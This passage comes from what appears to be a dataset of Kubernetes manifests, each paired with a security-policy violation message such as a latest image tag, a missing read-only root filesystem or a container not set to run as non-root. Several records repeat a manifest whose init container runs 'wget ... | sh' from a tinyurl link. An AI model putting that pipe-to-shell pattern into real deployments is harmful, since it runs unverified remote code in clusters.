    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cli\" is using an invalid container image, \"target/consensource-cli\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01114",
    "manifest_path": "data/manifests/the_stack_sample/sample_0291.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cli\" does not have a read-only root file system"
  },
  {
    "id": "01115",
    "manifest_path": "data/manifests/the_stack_sample/sample_0291.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cli\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cli\n  template:\n    metadata:\n      labels:\n        app: cli\n    spec:\n      containers:\n      - name: cli\n        image: target/consensource-cli\n        imagePullPolicy: IfNotPresent\n        resources:\n          limits:\n            cpu: 50m\n            memory: 100Mi\n          requests:\n            cpu: 20m\n            memory: 50Mi\n        command:\n        - bash\n        args:\n        - -c\n        - 'tail -f /dev/null\n\n          '\n        volumeMounts:\n        - name: consensource-keys\n          mountPath: /root/.sawtooth\n          readOnly: true\n      volumes:\n      - name: consensource-keys\n        secret:\n          secretName: cli\n          items:\n          - key: sawtooth-pub-key\n            path: keys/root.pub\n          - key: sawtooth-priv-key\n            path: keys/root.priv\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cli\" is not set to runAsNonRoot"
  },
  {
    "id": "01116",
    "manifest_path": "data/manifests/the_stack_sample/sample_0293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: keda-olm-operator\n  template:\n    metadata:\n      labels:\n        name: keda-olm-operator\n    spec:\n      serviceAccountName: keda-olm-operator\n      containers:\n      - name: keda-olm-operator\n        image: ghcr.io/kedacore/keda-olm-operator:main\n        command:\n        - /manager\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"keda-olm-operator\" does not have a read-only root file system"
  },
  {
    "id": "01117",
    "manifest_path": "data/manifests/the_stack_sample/sample_0293.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: keda-olm-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: keda-olm-operator\n  template:\n    metadata:\n      labels:\n        name: keda-olm-operator\n    spec:\n      serviceAccountName: keda-olm-operator\n      containers:\n      - name: keda-olm-operator\n        image: ghcr.io/kedacore/keda-olm-operator:main\n        command:\n        - /manager\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 25\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 20\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"keda-olm-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "01118",
    "manifest_path": "data/manifests/the_stack_sample/sample_0297.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:latest\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n      serviceAccountName: keptn-ds-default\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"distributor\" is using an invalid container image, \"keptn/distributor:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01119",
    "manifest_path": "data/manifests/the_stack_sample/sample_0297.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:latest\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n      serviceAccountName: keptn-ds-default\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"distributor\" does not have a read-only root file system"
  },
  {
    "id": "01120",
    "manifest_path": "data/manifests/the_stack_sample/sample_0297.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mongodb-datastore-distributor\n  namespace: keptn-datastore\nspec:\n  selector:\n    matchLabels:\n      run: distributor\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        run: distributor\n    spec:\n      containers:\n      - name: distributor\n        image: keptn/distributor:latest\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            memory: 32Mi\n            cpu: 50m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: PUBSUB_IMPL\n          value: nats\n        - name: PUBSUB_URL\n          value: nats://keptn-nats-cluster.keptn.svc.cluster.local\n        - name: PUBSUB_TOPIC\n          value: sh.keptn.>\n        - name: PUBSUB_RECIPIENT\n          value: mongodb-datastore\n        - name: PUBSUB_RECIPIENT_PATH\n          value: /event\n      serviceAccountName: keptn-ds-default\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"distributor\" is not set to runAsNonRoot"
  },
  {
    "id": "01121",
    "manifest_path": "data/manifests/the_stack_sample/sample_0298.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01122",
    "manifest_path": "data/manifests/the_stack_sample/sample_0298.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "01123",
    "manifest_path": "data/manifests/the_stack_sample/sample_0298.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "01124",
    "manifest_path": "data/manifests/the_stack_sample/sample_0298.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "01125",
    "manifest_path": "data/manifests/the_stack_sample/sample_0298.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2881\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "01126",
    "manifest_path": "data/manifests/the_stack_sample/sample_0301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:latest\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"api\" is using an invalid container image, \"theindiangeek/edjx-api:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01127",
    "manifest_path": "data/manifests/the_stack_sample/sample_0301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:latest\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"api\" does not have a read-only root file system"
  },
  {
    "id": "01128",
    "manifest_path": "data/manifests/the_stack_sample/sample_0301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:latest\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"api\" is not set to runAsNonRoot"
  },
  {
    "id": "01129",
    "manifest_path": "data/manifests/the_stack_sample/sample_0301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:latest\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"api\" has cpu request 0"
  },
  {
    "id": "01130",
    "manifest_path": "data/manifests/the_stack_sample/sample_0301.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: api\n  template:\n    metadata:\n      labels:\n        app: api\n    spec:\n      containers:\n      - name: api\n        image: theindiangeek/edjx-api:latest\n        ports:\n        - containerPort: 8081\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"api\" has memory limit 0"
  },
  {
    "id": "01131",
    "manifest_path": "data/manifests/the_stack_sample/sample_0303.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"config-service\" does not have a read-only root file system"
  },
  {
    "id": "01132",
    "manifest_path": "data/manifests/the_stack_sample/sample_0303.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"config-service\" is not set to runAsNonRoot"
  },
  {
    "id": "01133",
    "manifest_path": "data/manifests/the_stack_sample/sample_0303.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"config-service\" has cpu request 0"
  },
  {
    "id": "01134",
    "manifest_path": "data/manifests/the_stack_sample/sample_0303.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-service\n  labels:\n    app: config-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-service\n  template:\n    metadata:\n      labels:\n        app: config-service\n    spec:\n      containers:\n      - name: config-service\n        image: polarbookshop/config-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 8888\n        env:\n        - name: BPL_JVM_THREAD_COUNT\n          value: '50'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"config-service\" has memory limit 0"
  },
  {
    "id": "01135",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "01136",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"webinit\" does not have a read-only root file system"
  },
  {
    "id": "01137",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "01138",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"webinit\" is not set to runAsNonRoot"
  },
  {
    "id": "01139",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "01140",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"webinit\" has cpu request 0"
  },
  {
    "id": "01141",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "01142",
    "manifest_path": "data/manifests/the_stack_sample/sample_0306.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web-canary\n  namespace: canary\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: zoolgle/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      initContainers:\n      - name: webinit\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: web-app-volume\n          mountPath: /app\n      volumes:\n      - name: web-app-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"webinit\" has memory limit 0"
  },
  {
    "id": "01143",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        - -feature-gates=RecoverVolumeExpansionFailure=true\n        - -timeout=240s\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.5.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29602\n        - --v=2\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: azuredisk\n        image: mcr.microsoft.com/k8s/csi/azuredisk-csi:v1.14.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29604\n        - --user-agent-suffix=OSS-kubectl\n        - --disable-avset-nodes=false\n        - --allow-empty-cloud-config=false\n        ports:\n        - containerPort: 29602\n          name: healthz\n          protocol: TCP\n        - containerPort: 29604\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"azuredisk\" does not have a read-only root file system"
  },
  {
    "id": "01144",
    "manifest_path": "data/manifests/the_stack_sample/sample_0307.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-azuredisk-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-azuredisk-controller\n  template:\n    metadata:\n      labels:\n        app: csi-azuredisk-controller\n    spec:\n      serviceAccountName: csi-azuredisk-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - --feature-gates=Topology=true\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --timeout=15s\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --worker-threads=40\n        - --extra-create-metadata=true\n        - --strict-topology=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-attacher\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-attacher:v3.4.0\n        args:\n        - -v=2\n        - -csi-address=$(ADDRESS)\n        - -timeout=600s\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -worker-threads=500\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-snapshotter\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-snapshotter:v5.0.1\n        args:\n        - -csi-address=$(ADDRESS)\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: 